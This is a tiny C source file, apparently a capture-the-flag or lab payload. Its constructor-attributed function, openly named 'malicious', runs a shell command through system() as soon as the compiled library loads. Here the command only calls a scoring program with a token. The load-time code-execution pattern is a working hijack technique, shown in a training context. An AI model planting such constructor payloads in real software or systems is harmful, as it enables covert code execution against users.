#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 5d513439-ab65-4d05-81b5-e390a00079cb");
}
